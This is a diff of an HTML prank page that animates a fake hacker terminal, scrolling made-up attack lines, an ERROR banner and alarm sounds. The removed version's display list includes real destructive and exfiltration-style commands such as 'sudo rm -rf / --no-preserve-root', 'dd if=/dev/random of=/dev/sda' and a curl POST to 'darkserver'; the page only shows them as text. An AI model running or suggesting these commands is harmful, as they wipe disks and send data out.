@@ -1,176 +1,213 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Zero-Day Simulation</title>
+  <meta charset="UTF-8" />
+  <title>mhmtxaslan - Terminal</title>
   <style>
-    body {
-      margin:0; padding:0;
-      background:black; color:#0f0;
-      font-family:monospace;
-      overflow:hidden;
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      color: white;
+      overflow: hidden;
+      font-family: monospace;
     }
-    #startBtn {
-      position:fixed;
-      top:50%; left:50%;
-      transform:translate(-50%,-50%);
-      width:80px; height:80px;
-      font-size:48px;
-      color:red;
-      border:3px solid red;
-      background:black;
-      border-radius:50%;
-      cursor:pointer;
-      z-index:1000;
+    #startOverlay {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
     }
-    #mhmtBox {
-      position:fixed;
-      top:50%; left:50%;
-      transform:translate(-50%,-50%);
-      font-size:32px;
-      color:#0f0;
-      border:2px solid #0f0;
-      padding:20px 40px;
-      display:none;
-      animation:blink 1s infinite;
-      z-index:999;
+    #startButton {
+      font-size: 30px;
+      padding: 20px 40px;
+      color: red;
+      background: none;
+      border: 2px solid red;
+      cursor: pointer;
+    }
+    #mhmtxaslanBox {
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      border: 2px solid red;
+      padding: 20px;
+      display: none;
+      font-size: 30px;
+      z-index: 999;
+    }
+    .terminalBox {
+      position: absolute;
+      width: 45%;
+      height: 45%;
+      background: rgba(0,0,0,0.9);
+      border: 2px solid white;
+      overflow: hidden;
+      white-space: pre-wrap;
+      padding: 10px;
+      font-size: 14px;
+    }
+    #boxTop {
+      top: 5%;
+      left: 5%;
+      border-color: white;
+      color: white;
+    }
+    #boxBottom {
+      bottom: 5%;
+      right: 5%;
+      border-color: lime;
+      color: lime;
+    }
+    #error {
+      position: absolute;
+      bottom: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      color: red;
+      font-size: 40px;
+      font-weight: bold;
+      display: none;
+      animation: blink 0.4s infinite;
+      z-index: 1000;
     }
     @keyframes blink {
-      0%, 100% {opacity: 1;}
-      50% {opacity: 0.3;}
+      0% { opacity: 1; }
+      50% { opacity: 0.1; }
+      100% { opacity: 1; }
     }
-    .terminal {
-      position:absolute;
-      width:90%;
-      height:40%;
-      padding:10px;
-      overflow:hidden;
-      background:black;
-      border:2px solid white;
-      font-size:16px;
-      white-space:pre-wrap;
-      display:none;
-      box-sizing:border-box;
+    .exclamations {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      font-size: 30px;
+      color: red;
     }
-    #topTerm {top:0; left:5%; color:white;}
-    #bottomTerm {bottom:0; left:5%; color:#0f0;}
-    #errorScreen {
-      display:none;
-      position:fixed;
-      top:50%; left:50%;
-      transform:translate(-50%,-50%);
-      font-size:48px;
-      color:red;
-      animation:flash 0.5s infinite alternate;
-      z-index:9999;
+    .exclamations span {
+      position: absolute;
+      animation: float 2s infinite linear;
     }
-    @keyframes flash {
-      0% {opacity: 1;}
-      100% {opacity: 0;}
-    }
-    .excl {
-      position:absolute;
-      color:red;
-      font-size:32px;
-      animation:flash 0.3s infinite;
-      z-index:9999;
+    @keyframes float {
+      0% { transform: translateY(0); opacity: 1; }
+      100% { transform: translateY(-100vh); opacity: 0; }
     }
   </style>
 </head>
 <body>
+  <div id="startOverlay">
+    <button id="startButton">X</button>
+  </div>
 
-<button id="startBtn">X</button>
-<div id="mhmtBox">@mhmtxaslan</div>
-<div id="topTerm" class="terminal"></div>
-<div id="bottomTerm" class="terminal"></div>
-<div id="errorScreen">!!! ERROR !!!</div>
-<audio id="alarm" loop>
-  <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
-</audio>
+  <div id="mhmtxaslanBox">mhmtxaslan</div>
+  <div id="boxTop" class="terminalBox"></div>
+  <div id="boxBottom" class="terminalBox"></div>
+  <div id="error">ERROR</div>
+  <div class="exclamations" id="exclamations"></div>
 
-<script>
-const startBtn = document.getElementById("startBtn");
-const mhmtBox = document.getElementById("mhmtBox");
-const topTerm = document.getElementById("topTerm");
-const bottomTerm = document.getElementById("bottomTerm");
-const errorScreen = document.getElementById("errorScreen");
-const alarm = document.getElementById("alarm");
+  <audio id="alarmSound" src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" loop></audio>
+  <audio id="beep" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" loop></audio>
 
-const commands = [
-  "curl -X POST http://darkserver/upload",
-  "LongLongEarth.exe --deep-scan",
-  "sudo rm -rf / --no-preserve-root",
-  "ping 127.0.0.1 -t",
-  "nmap -sS 192.168.1.0/24",
-  "tracert 10.0.0.1",
-  "inject payload into memory",
-  "git clone http://evil.git/rootkit",
-  "dd if=/dev/random of=/dev/sda",
-  "echo HACKED > C:\\system32\\boot.ini"
-];
+  <script>
+    const startBtn = document.getElementById('startButton');
+    const overlay = document.getElementById('startOverlay');
+    const mhmBox = document.getElementById('mhmtxaslanBox');
+    const boxTop = document.getElementById('boxTop');
+    const boxBottom = document.getElementById('boxBottom');
+    const errorText = document.getElementById('error');
+    const alarmSound = document.getElementById('alarmSound');
+    const beepSound = document.getElementById('beep');
+    const exclamations = document.getElementById('exclamations');
 
-startBtn.onclick = () => {
-  startBtn.style.display = "none";
-  mhmtBox.style.display = "block";
+    const lines = [
+      "Connecting to root@longlong.earth...",
+      "curl --trace-ascii hack.localhost --upload-file...",
+      "ping 127.0.0.1 - flood starting...",
+      "bruteforcing /etc/passwd",
+      "proxychains -q nmap -T4 -A -v 192.168.0.1",
+      "TOR SOCK5 initiating",
+      "encrypted payload >> received",
+      "SYS_WRITE_ERROR",
+      "firewall bypassed",
+      "malware injected >>>",
+      "flag.txt --> /root/capture",
+      "DNS override initiated",
+      "access granted [root]",
+      "system overloaded...",
+      "cracking AES-256...",
+      "injecting: 0xdeadbeef",
+      "kernel panic incoming...",
+      "reverse shell active",
+      "establishing persistence...",
+      "system hijacked..."
+    ];
 
-  // 3. saniyede renk kırmızı oluyor
-  setTimeout(() => {
-    mhmtBox.style.color = "red";
-    mhmtBox.style.borderColor = "red";
-  }, 3000);
-
-  // 5. saniyede kayboluyor ve terminaller başlıyor
-  setTimeout(() => {
-    mhmtBox.style.display = "none";
-    topTerm.style.display = "block";
-    bottomTerm.style.display = "block";
-    startTerminals();
-  }, 5000);
-};
-
-function startTerminals() {
-  let count = 0;
-  const maxLines = 40;
-
-  const terminalInterval = setInterval(() => {
-    const cmd = commands[Math.floor(Math.random()*commands.length)];
-    const color = count > 20 ? "red" : "#0f0";
-
-    topTerm.innerHTML += `<div style="color:white;">${cmd}</div>`;
-    bottomTerm.innerHTML += `<div style="color:${color};">${cmd}</div>`;
-
-    topTerm.scrollTop = topTerm.scrollHeight;
-    bottomTerm.scrollTop = bottomTerm.scrollHeight;
-
-    count++;
-    if (count >= maxLines) {
-      clearInterval(terminalInterval);
+    function randomLine() {
+      return lines[Math.floor(Math.random() * lines.length)];
     }
-  }, 100); // yazı hızı artırıldı
-}
 
-// 20. saniyede alarm başlar
-setTimeout(() => {
-  alarm.play();
-}, 20000);
+    function startSimulation() {
+      overlay.style.display = 'none';
+      mhmBox.style.display = 'block';
 
-// 30. saniyede ERROR ekranı ve ünlemler
-setTimeout(() => {
-  errorScreen.style.display = "block";
-  spawnExclamations(40);
-}, 30000);
+      // 1. MHMTXASLAN kutusu 3 saniyede kırmızıya dönecek
+      setTimeout(() => {
+        mhmBox.style.color = 'red';
+      }, 3000);
 
-function spawnExclamations(num) {
-  for (let i = 0; i < num; i++) {
-    const excl = document.createElement("div");
-    excl.classList.add("excl");
-    excl.textContent = "!";
-    excl.style.top = Math.random() * 100 + "vh";
-    excl.style.left = Math.random() * 100 + "vw";
-    document.body.appendChild(excl);
-  }
-}
-</script>
+      // 2. 5 saniyede kutu kaybolur, terminal kutular başlar
+      setTimeout(() => {
+        mhmBox.style.display = 'none';
+        boxTop.style.display = 'block';
+        boxBottom.style.display = 'block';
 
+        let topContent = '';
+        let bottomContent = '';
+        let count = 0;
+
+        const interval = setInterval(() => {
+          if (count < 50) {
+            topContent += randomLine() + '\n';
+            boxTop.textContent = topContent;
+          } else if (count < 100) {
+            bottomContent += randomLine() + '\n';
+            boxBottom.textContent = bottomContent;
+          } else {
+            clearInterval(interval);
+          }
+          count++;
+        }, 100); // daha hızlı akış
+
+        // Bip sesi kutularla birlikte başlar
+        beepSound.play();
+
+      }, 5000);
+
+      // 25. saniyede ERROR + Alarm + ünlem animasyonu
+      setTimeout(() => {
+        errorText.style.display = 'block';
+        alarmSound.play();
+        createExclamations();
+      }, 25000);
+    }
+
+    function createExclamations() {
+      for (let i = 0; i < 50; i++) {
+        const span = document.createElement('span');
+        span.textContent = '!';
+        span.style.left = Math.random() * 100 + 'vw';
+        span.style.top = Math.random() * 100 + 'vh';
+        exclamations.appendChild(span);
+      }
+    }
+
+    startBtn.addEventListener('click', startSimulation);
+  </script>
 </body>
 </html>
